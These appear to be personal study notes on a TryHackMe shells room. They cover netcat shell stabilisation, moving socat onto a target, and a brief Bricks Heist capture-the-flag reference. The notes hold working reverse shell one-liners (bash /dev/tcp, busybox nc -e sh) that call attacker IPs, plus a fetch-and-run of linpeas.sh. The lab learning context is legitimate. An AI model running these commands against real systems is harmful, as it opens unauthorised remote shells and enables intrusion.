# What the Shell? 

> https://tryhackme.com/r/room/introtoshells

## Task 5 : Netcat Shell Stabilisation 

### Technique 1: Python
```
# ATTACKER MACHINE
sudo nc -lvnp 1337
python -c 'import pty;pty.spawn("/bin/bash")'
          OR
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
```

### Technique 2: rlwrap
> [!NOTE]
> rlwrap is a program which, in simple terms, gives us `access to history, tab autocompletion and the arrow keys immediately upon receiving a shell`; however, some manual stabilisation must still be utilised if you want to be able to use `Ctrl + C` inside the shell.
> Prepending our netcat listener with `"rlwrap"` gives us a much more `fully featured shell`. This technique is particularly `useful when dealing with Windows shells`, which are otherwise `notoriously difficult to stabilise`.
```
sudo apt install rlwrap
rlwrap nc -lvnp <port>
Ctrl + Z
stty raw -echo; fg
```
# Technique 3: Socat
>[!Note]
> Bear in mind that this `technique is limited to Linux targets`, as a Socat shell `on Windows will be no more stable` than a netcat shell.

> Download: https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64

> Transfer to the target machine
```
sudo python3 -m http.server 80
```
# On Linux this would be accomplished with curl or wget
```
wget <LOCAL-IP>/socat -O /tmp/socat
```
# in a Windows CLI environment the same can be done with `Powershell`
```
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```
> With any of the above techniques, it's useful to be able to change your terminal `tty size`. 
```
stty -a
stty rows <number>
          AND
stty cols <number>
```

---
# Linux Reverse Shell

#### we will see that we have a stable shell access

or

**Gaining a stable connection with the use of pwncat-cs**


```
bash -c 'exec bash -i >& /dev/tcp/10.9.1.60/9001 0>&1'
          OR
bash -c 'exec bash -i &>/dev/tcp/10.10.31.62/4444 <&1'

```

> Make sure to run a listener in another terminal to recieve the connection.

```
nc -lnvp 9001
ls -la
wget http://10.9.1.60/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

```

### Shell Access Gained

Gaining a stable connection with the use of `pwncat-cs`
Start a pwncat-cs listener on port 1234 of the attacker machine

```
# Attacker Machine
pwncat-cs -lp 1234

Running a reverse shell command
> busybox(1) - The Swiss Army Knife of Embedded Linux
# Victim Machine
busybox nc attacker-ip port -e sh
```
- https://systemweakness.com/tryhack3m-bricks-heist-write-up-302b62d07b74
  
**Stable shell gained** and flag has been captured


